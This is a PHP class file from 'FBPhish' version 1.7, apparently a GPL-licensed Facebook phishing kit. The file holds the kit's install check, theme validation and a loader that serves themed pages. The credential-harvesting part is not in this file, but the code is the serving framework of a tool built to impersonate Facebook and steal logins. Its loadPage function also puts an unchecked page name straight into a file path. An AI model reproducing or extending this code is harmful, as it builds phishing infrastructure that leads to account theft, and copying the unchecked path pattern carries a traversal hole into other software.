<?php
/*
FBPhish
Copyright (C) 2016  Jamie4224

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see http://www.gnu.org/licenses/.
*/



require_once(__DIR__ . "/../config.inc.php");

spl_autoload_register(function ($class) {
    require_once(__DIR__ . '/' . $class . '.class.php');
});

class FBPhish extends sql{
	public $version = "1.7";

	private $content;
	private $page;
	private $themecheck_results;
	private $themecheck_results_i;
	private $themecheck_results_im;
	private $apppath;
	public $debug;

	public function __construct() {
		$this->installcheck();
	}

	public function init() {
		$this->__construct();
	}

	public function installcheck(){
		global $apppath;
		global $debug;

		if(is_dir("$apppath/install")){
			echo "<h1>Please delete install dir after installation</h1>";
			echo "<h3>The /install dir should be deleted</h3>";
			if($debug != "true"){
				die();
			}
		}
	}

	public function themecheck() {
		global $debug;
		global $apppath;
		global $theme;
		global $apppath;

		$apppath = __DIR__;


		$this->themecheck_results = array();
		if(is_dir("$apppath/../themes/$theme")){
			$this->themecheck_results[] = "<br>Theme folder: Ok";
		}else{
			$this->themecheck_results[] = "<br>Theme folder: Missing (\"$theme\")";
		}

		if(file_exists("$apppath/../themes/$theme/home.php")){
			$this->themecheck_results[] = "<br>Home page: Ok";
		}else{
			$this->themecheck_results[] = "<br>Home page: Missing";
		}

		$this->themecheck_results_im = implode($this->themecheck_results, ';');

		if(strpos($this->themecheck_results_im, "Missing") != false){
			echo "<br>Your theme is invalid:";
			foreach($this->themecheck_results as $this->themecheck_results_i){
				echo $this->themecheck_results_i;
			}
			die();
		}else{
			if($debug == "true"){
				echo "<br>Your theme is valid:";
				foreach($this->themecheck_results as $this->themecheck_results_i){
					echo $this->themecheck_results_i;
				}
			}
		}
	}

	public function loadPage($page) {
		global $theme;
		global $apppath;
		global $apppath;

		$apppath = __DIR__;

		if($page != "home"){
			$this->content = file_get_contents("$apppath/../themes/$theme/pages/$page.php");
		}else{
			$this->content = file_get_contents("$apppath/../themes/$theme/home.php");
		}

		return $this->content;
	}
}